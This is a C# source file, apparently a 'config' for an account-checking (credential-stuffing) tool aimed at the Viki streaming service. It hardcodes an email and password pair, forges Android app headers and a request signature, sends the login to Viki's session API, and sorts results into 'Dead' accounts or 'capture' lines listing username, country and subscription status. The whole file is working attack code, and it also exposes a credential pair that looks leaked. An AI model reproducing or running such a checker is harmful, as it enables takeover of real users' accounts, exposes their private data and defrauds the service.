using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Fox.Configs
{
    internal class Viki
    {
        public static void viki()
        {
            using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
            {
                string email = "ireen_rivas@hotmail.com";
                string pass = "kagome9654564";
                // Get current UTC time
                DateTime currentTime = DateTime.UtcNow;
                // Unix time starts on 1970-01-01
                DateTime unixStart = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc);
                // Calculate the difference in seconds
                long unixTimestamp = (long)(currentTime - unixStart).TotalSeconds;
                // Convert this to a string
                string unixTimestampString = unixTimestamp.ToString();

                req.IgnoreProtocolErrors = true;
                req.AddHeader("accept-encoding", "gzip");
                req.AddHeader("accept-language", "en");
                req.AddHeader("cache-control", "Keep-Alive");
                req.AddHeader("host", "api.viki.io");
                req.AddHeader("signature", "3bd7779e2f87025500efdd4700130cedf88477f7");
                req.AddHeader("timestamp", unixTimestampString);
                req.UserAgent = "okhttp/4.10.0";
                req.AddHeader("x-viki-app-ver", "23.3.2");
                req.AddHeader("x-viki-as-id", "100005a-1682708676-1357");
                req.AddHeader("x-viki-carrier", "AT&T");
                req.AddHeader("x-viki-connection-type", "UNKNOWN");
                req.AddHeader("x-viki-device-id", "150228657d");
                req.AddHeader("x-viki-device-model", "SM-S901N");
                req.AddHeader("x-viki-device-os-ver", "9");
                req.AddHeader("x-viki-manufacturer", "samsung");
                string payload = "{\"user\":{\"source_platform\":\"android\",\"source_device\":\"SM-S901N\",\"source_partner\":\"viki\",\"registration_method\":\"standard\"},\"source\":{\"platform\":\"android\",\"device\":\"SM-S901N\",\"partner\":\"viki\",\"method\":\"standard\"},\"username\":\"" + email +"\",\"password\":\"" + pass +"\"}";
                string send_data = req.Post("https://api.viki.io/v5/sessions.json?app=100005a", payload, "application/json").ToString();
                if (send_data.Contains("token"))
                {

                    var email_verific = Fox.Fuctions.Parsing.JSON(send_data, "email_verified");
                    string emailp = String.Join(", ", email_verific);

                    var username = Fox.Fuctions.Parsing.JSON(send_data, "username");
                    string usernamep = String.Join(", ", username);

                    var name = Fox.Fuctions.Parsing.JSON(send_data, "name");
                    string namelp = String.Join(", ", name);

                    var Creationc = Fox.Fuctions.Parsing.LR(send_data, "created_at\":\"", "T");
                    string Creationp = String.Join(", ", Creationc);

                    var Country = Fox.Fuctions.Parsing.JSON(send_data, "country");
                    string Countryp = String.Join(", ", Country);

                    var Subscription = Fox.Fuctions.Parsing.JSON(send_data, "subscriber");
                    string Subscriptionlp = String.Join(", ", Subscription);
                    string capture = " + " + email + ":" + pass + "| Email_verified = " + emailp  + " | Username = " + usernamep + " | Name = " + namelp + " | Creation Date = " + Creationp + " Country = " + Countryp + " | Has Subscription = " + Subscriptionlp;
                    if (Subscriptionlp.Contains("True"))
                    {
                        Console.WriteLine(capture);
                    }
                    else if (Subscription.Contains("False"))
                    {
                        string capturecstom = " / " + email + ":" + pass + "| Email_verified = " + emailp + " | Username = " + usernamep + " | Name = " + namelp + " | Creation Date = " + Creationp + " Country = " + Countryp + " | Has Subscription = " + Subscriptionlp;
                        Console.WriteLine(capturecstom);
                    }
                   
                }
                else if (send_data.Contains("Invalid username or password"))
                {
                    Console.WriteLine("Dead");

                }
                
                Console.ReadKey();
                Console.ReadKey();
                Console.ReadKey();
                Console.ReadKey();
                Console.ReadKey();

            }
        
        }
    }
}
